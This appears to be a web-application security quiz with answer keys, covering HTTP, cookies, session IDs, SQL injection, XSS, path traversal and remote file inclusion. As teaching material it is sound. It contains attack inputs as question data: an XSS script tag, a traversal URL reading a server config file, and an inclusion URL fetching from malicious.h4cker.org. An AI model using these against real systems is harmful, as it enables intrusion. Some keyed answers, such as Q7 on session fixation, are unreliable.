# Module 6: Web Application Vulnerabilities

## Q1
**Question:** Which two functions are provided by a web proxy device? (Choose two.)
**Type:** multi
**Options:**
- Caching of HTTP messages
- Scanning a web server for related contents
- Translating HTTP messages to FTP and SMTP messages
- Enabling HTTP transfers across a firewall
- Encrypting HTTP packets transmitted between web clients and web servers
**Answer:** Caching of HTTP messages; Enabling HTTP transfers across a firewall
**Explanation:** HTTP proxies act as both servers and clients, making requests to web servers on behalf of other clients. They enable HTTP transfers across firewalls and support caching of HTTP messages.

## Q2
**Question:** Match the HTTP status code contained in a web server response to the description.
**Type:** matching
**Pairs:**
- Codes in the 100 range -> Informational
- Codes in the 200 range -> Related to successful transactions
- Codes in the 300 range -> Related to HTTP redirections
- Codes in the 400 range -> Related to client errors
- Codes in the 500 range -> Related to server errors
**Explanation:** HTTP status code ranges each signal a different category of server response, from informational messages through client- and server-side errors.

## Q3
**Question:** Match the elements in the URL `ftp://xyz-company.com:2457/support/file;id=65?name=intro&r=true` to the description.
**Type:** matching
**Pairs:**
- ftp -> Scheme
- xyz-company.com -> Host
- 2457 -> Port
- support/file -> Path
- id=65 -> Path-segment-params
- name=intro&r=true -> Query-string
**Explanation:** A URL is composed of several distinct parts — scheme, host, port, path, path-segment parameters, and query string — each serving a specific addressing role.

## Q4
**Question:** Which function is provided by HTTP 2.0 to improve performance over HTTP 1.1?
**Type:** single
**Options:**
- HTTP 2.0 compresses HTTP messages.
- HTTP 2.0 provides HTTP message multiplexing and requires fewer messages to download web content.
- HTTP 2.0 uses tokens as a mechanism to track web sessions.
- Enabling HTTP transfers across a firewall.
- HTTP 2.0 uses UDP instead of TCP as transport layer protocol.
**Answer:** HTTP 2.0 provides HTTP message multiplexing and requires fewer messages to download web content.
**Explanation:** HTTP 1.1 loads resources one at a time per GET/RESPOND cycle. HTTP 2.0 multiplexes this process so a client can send multiple GET messages simultaneously, improving performance. Both versions use TCP, compress messages, and use tokens to track sessions.

## Q5
**Question:** Why should application developers change the session ID names used by common web application development frameworks?
**Type:** single
**Options:**
- These session ID names are not published in public documents.
- These session ID names can be used to fingerprint the application framework employed.
- These session ID names are used randomly and make integration of frameworks impossible.
- These session ID names typically contain a short length of numerical numbers and can be easily cracked.
**Answer:** These session ID names can be used to fingerprint the application framework employed.
**Explanation:** Default session ID names (e.g., PHPSESSID, JSESSIONID, CFID/CFTOKEN, ASP.NET_SessionId) can reveal the underlying framework and language, so changing them to a generic name is recommended.

## Q6
**Question:** A user is using an online shopping website to order laptop computers. Which mechanism is used by the shopping site to securely maintain user authentication during shopping?
**Type:** single
**Options:**
- IP address
- Session ID
- Username and password
- One-time password assigned
**Answer:** Session ID
**Explanation:** After a user authenticates, the web application creates a session, and the session ID becomes temporarily equivalent to the strongest authentication method used, letting the app identify the user on subsequent requests.

## Q7
**Question:** What is the best mitigation approach against session fixation attacks?
**Type:** single
**Options:**
- Ensure that the session ID uses at least 64 bits of characters.
- Ensure that the session ID is used after a user completes authentication.
- Ensure that the session ID is exchanged only though an encrypted channel.
- Ensure that the session ID changes from the default session name used by the web application framework.
**Answer:** Ensure that the session ID is exchanged only though an encrypted channel.
**Explanation:** Encrypting the entire web session — not just credential exchange — protects the session ID from interception and injection, which is central to preventing session fixation attacks.

## Q8
**Question:** Which two attributes can be set in a web application cookie to indicate it is a persistent cookie? (Choose two.)
**Type:** multi
**Options:**
- Expires
- Max-Age
- Domain
- Secure
- Path
**Answer:** Expires; Max-Age
**Explanation:** A cookie with an Expires or Max-Age attribute is considered persistent and is stored on disk by the browser until it expires, as opposed to a non-persistent (session) cookie.

## Q9
**Question:** Which international organization is dedicated to educating industry professionals, creating tools, and evangelizing best practices for securing web applications and underlying systems?
**Type:** single
**Options:**
- Common Vulnerabilities and Exposures (CVE)
- Open Web Application Security Project (OWASP)
- Institution of Electrical and Electronics Engineering (IEEE)
- SysAdmin, Audit, Network and Security (The SANS Institute)
**Answer:** Open Web Application Security Project (OWASP)
**Explanation:** OWASP is dedicated to web application security education, tooling, and best practices. IEEE is a general electronics/electrical engineering association, SANS is a private security training company, and CVE consolidates cybersecurity tools/databases internationally.

## Q10
**Question:** Which component in the statement below is most likely user input on a web form? `SELECT * FROM group WHERE attack = 'network' AND a-type LIKE 'ping%';`
**Type:** single
**Options:**
- ping
- group
- attack
- a-type
- network
**Answer:** ping
**Explanation:** The LIKE operator with a % wildcard searches for values starting with "ping" in the a-type column — the kind of search term a user would type into a form field.

## Q11
**Question:** Which statement describes an example of an out-of-band SQL injection attack?
**Type:** single
**Options:**
- An attacker launches the attack on a web site and forces the web application to delay the query results.
- An attacker launches the attack on a web site and views the query results immediately on the screen.
- An attacker launches the attack on a web site and reconstructs the information by sending specific SQL statements.
- An attacker launches the attack on a web site and forces the web application to send the query results via an email.
**Answer:** An attacker launches the attack on a web site and forces the web application to send the query results via an email.
**Explanation:** Out-of-band SQL injection retrieves data through a different channel than the response itself — for example, sending results via email, text, or instant message.

## Q12
**Question:** A threat actor launches an SQL injection attack against a web site by sending multiple specific statements to the web site and reconstructing the key information the threat actor seeks. What type of SQL injection attack is the threat actor using?
**Type:** single
**Options:**
- Blind
- In-band
- Error-based
- Out-of-band
**Answer:** Blind
**Explanation:** In a blind (inferential) SQL injection, the attacker doesn't see displayed or transferred data directly, but reconstructs information by sending specific statements and observing the application/database's behavior.

## Q13
**Question:** An attacker launches an SQL injection attack on a web application by trying to force the application requesting the back-end database to perform multiple SELECT queries. Which technique exploits the SQL injection vulnerability on the web application?
**Type:** single
**Options:**
- Boolean
- Error-based
- Out-of-band
- Union operator
- Time delay
**Answer:** Union operator
**Explanation:** The union operator technique is used when a vulnerability allows combining two SELECT queries into a single result set. Boolean tests true/false conditions, error-based forces database errors, out-of-band uses a different channel to obtain records, and time delay uses database commands to delay responses.

## Q14
**Question:** Which type of SQL query is in the SQL statement `select * from users where user = "admin";`?
**Type:** single
**Options:**
- Static query
- Stacked query
- Out-of-band query
- Parameterized query
**Answer:** Static query
**Explanation:** Immutable queries (static queries, parameterized queries, and non-dynamic stored procedures) don't contain interpretable injected data. A fixed literal value bound directly into the query without user-controlled interpretation is an example of a static query.

## Q15
**Question:** A company uses the Microsoft Active Directory service to manage the authentication and authorization of employee workstations. The company hires a cybersecurity professional to perform compliance penetration testing. Which type of penetration testing can be used to verify the proper configuration of the Active Directory service?
**Type:** single
**Options:**
- LDAP injection
- SQL Union injection
- HTTP command injection
- Stacked query SQL injection
**Answer:** LDAP injection
**Explanation:** Active Directory uses LDAP for authentication and directory access. LDAP injection vulnerabilities are input validation flaws attackers exploit to inject and execute queries against LDAP servers.

## Q16
**Question:** What is a potentially dangerous web session management practice?
**Type:** single
**Options:**
- Including the session ID in the URL
- Setting a cookie with the Expires attribute
- Setting a cookie with the Max-Age attribute
- Configuring a cookie with the HTTPOnly flag
**Answer:** Including the session ID in the URL
**Explanation:** Placing a session ID in the URL risks exposure and manipulation, potentially leading to session fixation attacks; mitigations include encrypting the entire session with HTTPS.

## Q17
**Question:** A web application configures client cookies with the HTTPOnly flag. What is the effect of this flag?
**Type:** single
**Options:**
- It informs the web client that the cookie is a persistent cookie.
- It forces the web browser to have the cookies processed only by the server.
- It requires the web browser to establish a secure HTTPS link to the server.
- It indicates to the web browser that web client-based code can access the cookie.
**Answer:** It forces the web browser to have the cookies processed only by the server.
**Explanation:** The HTTPOnly flag prevents client-side code or scripts from accessing the cookie — it can only be processed by the server.

## Q18
**Question:** An organization has developed a network security policy stating that newly purchased routers and switches must be configured with advanced security measures before deploying them to the production network. Which threat does this policy mitigate?
**Type:** single
**Options:**
- Redirect attack
- Session hijacking
- Kerberos vulnerability
- Default credential attack
**Answer:** Default credential attack
**Explanation:** Attackers can easily locate and access systems using shared default passwords, so changing default manufacturer credentials before deployment is an important mitigation.

## Q19
**Question:** An attacker sends a request to an online university portal site with the information: `https://portal.a-univ.edu/?search=students&results=50&search=staff`. Which type of vulnerability does the attacker try to exploit?
**Type:** single
**Options:**
- Redirect
- Session hijacking
- Default credential
- HTTP parameter pollution
**Answer:** HTTP parameter pollution
**Explanation:** HTTP parameter pollution (HPP) occurs when multiple parameters share the same name, potentially causing the application to misinterpret values, bypass input validation, trigger errors, or alter internal variables.

## Q20
**Question:** A company has hired a cybersecurity firm to assess web server security posture. To test for cross-site scripting vulnerabilities, the tester will use the string `<script>alert("XSS Test Now")</script>`. Where would the tester use the string?
**Type:** single
**Options:**
- In an HTTP header
- In an error message
- In a terminal window on the server
- In a user input field in a web form
**Answer:** In a user input field in a web form
**Explanation:** A `<script>` tag payload is typically entered into a user input field in a web form, whereas a `javascript:` URI payload would be tested from the browser's address bar instead.

## Q21
**Question:** According to OWASP, which three statements are rules to prevent XSS attacks? (Choose three.)
**Type:** multi
**Options:**
- Use the HTML `<a>` tag with JavaScript encoding.
- Use HTTPS only mode for accessing web applications.
- Use HTML escape before inserting untrusted data into HTML element content.
- Use the HTML img tag with a combination of hexadecimal HTML character references.
- Use attribute escape before inserting untrusted data into HTML common attributes.
- Use JavaScript escape before inserting untrusted data into JavaScript data values.
**Answer:** Use HTML escape before inserting untrusted data into HTML element content; Use attribute escape before inserting untrusted data into HTML common attributes; Use JavaScript escape before inserting untrusted data into JavaScript data values.
**Explanation:** OWASP's XSS prevention rules include escaping untrusted data appropriately for its context (HTML content, attributes, JavaScript, CSS, URL parameters), using auto-escaping templates, sanitizing markup, the HTTPOnly flag, content security policy, and the X-XSS-Protection header.

## Q22
**Question:** After some reconnaissance efforts, an attacker identified a web server hosted on a Linux system. The attacker then entered the URL: `http://192.168.46.82:45/vulnerabilities/fi/?page=../../../../../etc/httpd/httpd.conf`. Which type of web vulnerability is being exploited by the attacker?
**Type:** single
**Options:**
- Stored XSS
- Reflected XSS
- Directory traversal
- Cookie manipulation
**Answer:** Directory traversal
**Explanation:** Directory (path) traversal vulnerabilities let attackers access files outside the web root by manipulating variables with dot-dot-slash (../) sequences or absolute paths — here, to view the server's configuration file.

## Q23
**Question:** An attacker enters the following URL to exploit vulnerabilities in a web application: `http://192.168.47.8:76/files/fi/?page=http://malicious.h4cker.org/cookie.html`. Which type of vulnerability did the attacker try to exploit?
**Type:** single
**Options:**
- Directory traversal
- Cookie manipulation
- Local file inclusion
- Remote file inclusion
**Answer:** Remote file inclusion
**Explanation:** A remote file inclusion (RFI) vulnerability lets a user cause the application to execute code hosted on an external, attacker-controlled system — here, content from malicious.h4cker.org.

## Q24
**Question:** Because of an insecure code practice, an attacker can leverage and completely compromise an application or the underlying system. What insecure code practice enabled this catastrophic threat?
**Type:** single
**Options:**
- Lack of error handling
- Use of hard-coded credentials
- Overly verbose error handling
- Comments that contain too much information
**Answer:** Use of hard-coded credentials
**Explanation:** Hard-coded credentials are a catastrophic flaw attackers can leverage to fully compromise an application or its underlying system.

## Q25
**Question:** What is the best practice to mitigate the vulnerabilities from a lack of proper error handling in an application?
**Type:** single
**Options:**
- Use only a minimum set of error messages.
- Use a strong algorithm to encrypt the transmission of error messages.
- Use a well-thought-out scheme to provide meaningful error messages to the users but no useful information to an attacker.
- Use a third-party hosting service to provide coded error messages and transmit them securely to users, software developers, and support staff.
**Answer:** Use a well-thought-out scheme to provide meaningful error messages to the users but no useful information to an attacker.
**Explanation:** Improper error handling can leak information useful to attackers. Best practice is a deliberate scheme that gives users a meaningful message, gives developers/support diagnostic detail, and reveals nothing useful to an attacker.